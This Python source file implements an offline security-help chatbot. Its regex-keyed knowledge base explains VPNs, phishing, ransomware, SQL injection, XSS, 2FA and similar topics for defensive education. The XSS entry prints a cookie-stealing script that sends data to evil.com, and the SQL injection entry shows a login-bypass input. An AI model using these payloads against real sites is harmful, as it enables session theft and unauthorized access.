"""
ai_chat.py  -  AI Security Chat Assistant v10.0
Offline knowledge base + Anthropic API support
"""
import re, random
from datetime import datetime

# ── Comprehensive Security Knowledge Base ─────────────────────────────────

KB = {
    # Networking
    r"(what is|explain|define)\s*(a\s*)?vpn": {
        "title": "VPN (Virtual Private Network)",
        "answer": """A VPN encrypts your internet traffic and routes it through a secure server, hiding your real IP address.

HOW IT WORKS:
  1. Your device connects to VPN server
  2. All traffic is encrypted (AES-256)
  3. Websites see VPN server IP, not yours
  4. ISP cannot see your traffic

BEST VPNs:
  ✓ ProtonVPN    — Swiss privacy, free tier
  ✓ Mullvad      — No logs, anonymous
  ✓ WireGuard    — Fastest protocol
  ✗ Free VPNs    — Often sell your data!

USE WHEN:
  • Public WiFi (cafes, airports)
  • Accessing geo-blocked content
  • Protecting from ISP surveillance""",
    },

    r"(what is|explain|define)\s*(a\s*)?firewall": {
        "title": "Firewall",
        "answer": """A firewall monitors and controls incoming/outgoing network traffic based on rules.

TYPES:
  • Packet Filter   — checks IP/port headers
  • Stateful        — tracks connection state
  • Application     — inspects app layer (HTTP)
  • Next-Gen (NGFW) — DPI + IPS + SSL inspect

WINDOWS FIREWALL COMMANDS:
  Enable:  netsh advfirewall set allprofiles state on
  Block port: netsh advfirewall firewall add rule 
              name="Block_3389" dir=in action=block 
              protocol=TCP localport=3389

IMPORTANT PORTS TO BLOCK:
  ✗ 23   — Telnet (unencrypted)
  ✗ 3389 — RDP (brute-force target)
  ✗ 445  — SMB (ransomware vector)""",
    },

    r"(what is|explain|define|how does)\s*(a\s*)?phishing": {
        "title": "Phishing Attacks",
        "answer": """Phishing tricks users into revealing credentials via fake websites/emails.

TYPES:
  • Spear Phishing  — targeted at specific person
  • Whaling         — targets executives (CEO fraud)
  • Smishing        — via SMS
  • Vishing         — via phone call
  • Clone Phishing  — fake duplicate of real email

RED FLAGS:
  ⚠ Urgent language ("Act NOW!")
  ⚠ Mismatched URLs (paypa1.com)
  ⚠ Generic greeting ("Dear Customer")
  ⚠ Unexpected attachments
  ⚠ Requests for credentials

PROTECTION:
  ✓ Check URL carefully before clicking
  ✓ Use email filtering
  ✓ Enable 2FA on all accounts
  ✓ Verify by calling sender directly""",
    },

    r"(what is|explain)\s*(a\s*)?(ransomware|wannacry|petya)": {
        "title": "Ransomware",
        "answer": """Ransomware encrypts victim's files and demands payment for decryption key.

FAMOUS ATTACKS:
  • WannaCry (2017)  — 300,000 systems, $4B damage
  • NotPetya (2017)  — $10B damage, Ukraine attack
  • REvil (2021)     — Kaseya supply chain
  • LockBit (2022)   — Most active ransomware group

HOW IT SPREADS:
  1. Phishing email attachment
  2. RDP brute force (port 3389)
  3. Vulnerable software (Log4j, ProxyLogon)
  4. Malicious downloads

PROTECTION:
  ✓ Regular offline backups (3-2-1 rule)
  ✓ Keep Windows/software updated
  ✓ Disable RDP if not needed
  ✓ Use EDR (Endpoint Detection & Response)
  ✓ Network segmentation

IF INFECTED:
  1. Disconnect from network immediately
  2. Do NOT pay ransom (no guarantee)
  3. Report to law enforcement
  4. Restore from clean backup""",
    },

    r"(what is|explain|define)\s*(a\s*)?(sql injection|sqli)": {
        "title": "SQL Injection (SQLi)",
        "answer": """SQL injection inserts malicious SQL code into input fields to manipulate databases.

EXAMPLE:
  Input: admin' OR '1'='1
  Query becomes: SELECT * FROM users 
                 WHERE user='admin' OR '1'='1'
  Result: Bypasses login!

TYPES:
  • Classic    — direct error output
  • Blind      — true/false responses
  • Time-based — sleep() delays
  • UNION      — extract other tables

IMPACT:
  ✗ Bypass authentication
  ✗ Extract all database data
  ✗ Delete/modify records
  ✗ Remote code execution (xp_cmdshell)

PREVENTION:
  ✓ Parameterized queries (prepared statements)
  ✓ Input validation & sanitization
  ✓ WAF (Web Application Firewall)
  ✓ Principle of least privilege on DB user""",
    },

    r"(what is|explain|define)\s*(a\s*)?(xss|cross.site scripting)": {
        "title": "Cross-Site Scripting (XSS)",
        "answer": """XSS injects malicious scripts into web pages viewed by other users.

TYPES:
  • Stored XSS   — saved in database (persistent)
  • Reflected    — URL parameter (non-persistent)
  • DOM-based    — client-side JavaScript

EXAMPLE PAYLOAD:
  <script>document.location='http://evil.com/steal?c='+document.cookie</script>

IMPACT:
  ✗ Session cookie theft
  ✗ Keylogging on victim's browser
  ✗ Page defacement
  ✗ Redirect to malware

PREVENTION:
  ✓ Output encoding (HTML entities)
  ✓ Content Security Policy (CSP) header
  ✓ HttpOnly cookies
  ✓ Input validation""",
    },

    r"(how to|what is|explain)\s*(make|create|strong)?\s*strong\s*password|password\s*(tips|best practice)": {
        "title": "Strong Password Guide",
        "answer": """STRONG PASSWORD RULES:
  ✓ Length: 16+ characters minimum
  ✓ Mix: UPPER, lower, numb3rs, $ymb0ls
  ✓ Unique per site (never reuse!)
  ✓ No dictionary words
  ✓ No personal info (birthday, name)

BAD PASSWORDS:
  ✗ password123
  ✗ yourname1990
  ✗ 123456789
  ✗ qwerty

GOOD PASSWORD EXAMPLES:
  ✓ Tr0ub4dor&3      (16 chars, mixed)
  ✓ correct-horse-battery-staple (passphrase)
  ✓ M@ng0_Lahore#2024!

TOOLS:
  • Use a password manager (Bitwarden, KeePass)
  • Enable 2FA on everything
  • Check haveibeenpwned.com regularly

Our app has a Password Generator — use it!""",
    },

    r"(what is|explain|define)\s*(a\s*)?(2fa|two.factor|mfa|multi.factor)": {
        "title": "Two-Factor Authentication (2FA/MFA)",
        "answer": """2FA adds a second verification step beyond password.

FACTORS:
  • Something you KNOW  — password, PIN
  • Something you HAVE  — phone, hardware key
  • Something you ARE   — fingerprint, face

2FA TYPES (best to worst):
  1. Hardware key (YubiKey)     — BEST
  2. Authenticator app (TOTP)   — Very Good
  3. Push notification           — Good
  4. SMS/Text code               — Weak (SIM swap!)
  5. Email code                  — Weakest

SETUP WITH OUR APP:
  → Go to '2FA Setup' tab
  → Scan QR with Google Authenticator
  → Enter 6-digit code to verify
  → Never share your secret key!

IMPORTANT: Even with strong password,
enable 2FA — it stops 99.9% of attacks!""",
    },

    r"(what is|explain)\s*(a\s*)?(mitm|man.in.the.middle)": {
        "title": "Man-in-the-Middle (MITM) Attack",
        "answer": """MITM attack intercepts communication between two parties without their knowledge.

HOW IT WORKS:
  [Your Device] ←→ [ATTACKER] ←→ [Website]
  Attacker can READ and MODIFY all traffic!

TYPES:
  • ARP Spoofing    — poisons ARP cache
  • DNS Spoofing    — redirects domain to fake IP
  • SSL Stripping   — downgrades HTTPS to HTTP
  • Evil Twin WiFi  — fake AP with same SSID

VULNERABLE SITUATIONS:
  ✗ Public WiFi (airport, cafe, hotel)
  ✗ HTTP websites (no encryption)
  ✗ Ignoring SSL certificate warnings

PROTECTION:
  ✓ Use VPN on public WiFi
  ✓ Only use HTTPS sites
  ✓ Never ignore SSL warnings
  ✓ Use HSTS-enabled browsers
  ✓ Enable WiFi encryption (WPA3)""",
    },

    r"(what is|explain)\s*(a\s*)?(zero.?day|0day)": {
        "title": "Zero-Day Vulnerability",
        "answer": """A zero-day is a vulnerability unknown to the software vendor — no patch exists yet.

WHY CALLED ZERO-DAY:
  Vendor has had ZERO days to fix it!

VALUE:
  • Nation-state 0days: $1M-$2.5M+
  • Sold on dark web marketplaces
  • Used by APT groups (state hackers)

FAMOUS ZERO-DAYS:
  • EternalBlue (MS17-010) — NSA exploit, WannaCry
  • Heartbleed — OpenSSL memory leak
  • Log4Shell — Log4j JNDI injection
  • Follina — MSDT RCE via Word docs

PROTECTION:
  ✓ Keep software updated (patches for known)
  ✓ Network segmentation (limit blast radius)
  ✓ Endpoint Detection & Response (EDR)
  ✓ Zero Trust architecture
  ✓ Threat intelligence feeds""",
    },

    r"(wifi|wpa|wep|wpa2|wpa3)\s*(security|crack|hack|protect|difference)": {
        "title": "WiFi Security Standards",
        "answer": """WIFI SECURITY COMPARISON:
  
  WEP  (1997) — BROKEN ✗
    → Crackable in 60 seconds with aircrack-ng
    → Never use! Replace immediately.
  
  WPA  (2003) — WEAK ✗
    → TKIP cipher has vulnerabilities
    → Upgrade to WPA2/WPA3
  
  WPA2 (2004) — GOOD ✓
    → AES-CCMP encryption
    → Vulnerable to PMKID attack with weak password
    → Use 16+ char password to stay safe
  
  WPA3 (2018) — BEST ✓✓
    → SAE (Simultaneous Authentication of Equals)
    → Resistant to offline dictionary attacks
    → Forward secrecy (past traffic safe)

RECOMMENDATION:
  1. Use WPA3 if router supports it
  2. WPA2 with 16+ char random password
  3. Enable router firewall
  4. Change default router credentials
  5. Hide SSID (minor benefit)
  6. Enable MAC filtering (minor benefit)""",
    },

    r"(nmap|port scan|port scanning)": {
        "title": "Port Scanning with Nmap",
        "answer": """Nmap is the world's most popular network scanner.

BASIC COMMANDS:
  nmap 192.168.1.1          # Basic scan
  nmap -sV 192.168.1.1      # Version detection
  nmap -O 192.168.1.1       # OS detection
  nmap -p- 192.168.1.1      # All 65535 ports
  nmap -sn 192.168.1.0/24   # Ping sweep (host discovery)

IMPORTANT PORTS:
  21  — FTP      (file transfer, plaintext)
  22  — SSH      (secure shell)
  23  — Telnet   (plaintext, DISABLE!)
  25  — SMTP     (email)
  80  — HTTP     (web, unencrypted)
  443 — HTTPS    (web, encrypted)
  445 — SMB      (ransomware target)
  3389— RDP      (remote desktop)
  3306— MySQL    (database)

LEGAL NOTE:
  ⚠ Only scan networks you own or have permission!
  Unauthorized scanning is illegal.""",
    },

    r"(how to|tips|protect|secure)\s*(my|your|the)?\s*(computer|system|pc|laptop|windows)": {
        "title": "System Security Hardening Guide",
        "answer": """TOP 15 WINDOWS SECURITY TIPS:

  1. ✓ Enable Windows Firewall
  2. ✓ Keep Windows Updated (auto-updates)
  3. ✓ Use Windows Defender / antivirus
  4. ✓ Enable BitLocker disk encryption
  5. ✓ Use strong unique passwords + password manager
  6. ✓ Enable 2FA on all accounts
  7. ✓ Disable RDP if not needed (port 3389)
  8. ✓ Disable Telnet, FTP if not needed
  9. ✓ Regular backups (3-2-1 rule)
  10. ✓ Don't run as Administrator daily
  11. ✓ Be suspicious of email attachments
  12. ✓ Use HTTPS websites only
  13. ✓ VPN on public WiFi
  14. ✓ Lock screen when away (Win+L)
  15. ✓ Check installed programs regularly

Our app can help with many of these!
→ Auto-Fix tab for one-click fixes
→ Scheduler tab for auto-scans""",
    },

    r"(what is|explain)\s*(a\s*)?(ddos|dos|denial.of.service)": {
        "title": "DDoS / DoS Attacks",
        "answer": """DDoS (Distributed Denial of Service) floods a target with traffic to make it unavailable.

HOW IT WORKS:
  Millions of bots → flood target → server crash

TYPES:
  • Volumetric  — bandwidth flood (UDP, ICMP)
  • Protocol    — SYN flood, Ping of Death
  • Application — HTTP flood, Slowloris

FAMOUS ATTACKS:
  • Cloudflare 2023 — 201 million rps (largest ever)
  • GitHub 2018     — 1.35 Tbps memcached attack
  • Dyn 2016        — Mirai botnet, took down Twitter

PROTECTION:
  ✓ CDN (Cloudflare, Akamai)
  ✓ Rate limiting on web server
  ✓ Anycast network diffusion
  ✓ Traffic scrubbing services
  ✓ Proper firewall rules (SYN cookies)""",
    },
}

GREETINGS = [
    "AOA! Main aapka AI Security Assistant hoon 🛡️\nKoi bhi security sawaal poochhein!",
    "Hello! Security ke baare mein kuch jaanna chahte hain? Poochhein! 🔐",
    "Assalam o Alaikum! AI Security Assistant hazir hai. Kya seekhna chahte hain?",
]

SUGGESTIONS = [
    "💡 Try: 'What is VPN?'",
    "💡 Try: 'How to make strong password?'",
    "💡 Try: 'Explain ransomware'",
    "💡 Try: 'What is phishing?'",
    "💡 Try: 'WiFi security types?'",
    "💡 Try: 'What is SQL injection?'",
    "💡 Try: 'How to secure my PC?'",
    "💡 Try: 'What is 2FA?'",
]

def get_ai_response(query: str) -> dict:
    """Get AI response from knowledge base."""
    q = query.lower().strip()

    # Greetings
    if re.match(r'^(hi|hello|hey|salam|aoa|assalam|helo|salaam)\b', q):
        return {
            "title": "Security Assistant",
            "answer": random.choice(GREETINGS) + "\n\n" + "\n".join(SUGGESTIONS[:4]),
            "type": "greeting",
        }

    # KB lookup
    for pattern, info in KB.items():
        if re.search(pattern, q, re.IGNORECASE):
            return {"title": info["title"], "answer": info["answer"], "type": "kb"}

    # Fallback
    sugg = random.sample(SUGGESTIONS, min(4, len(SUGGESTIONS)))
    return {
        "title": "Security Assistant",
        "answer": f"Hmm, '{query}' ke baare mein mujhe specific info nahi mili.\n\n"
                  f"Yeh topics try karein:\n" + "\n".join(sugg) +
                  "\n\nYa koi aur security topic poochhein — main seekhta rehta hoon! 🤖",
        "type": "fallback",
    }
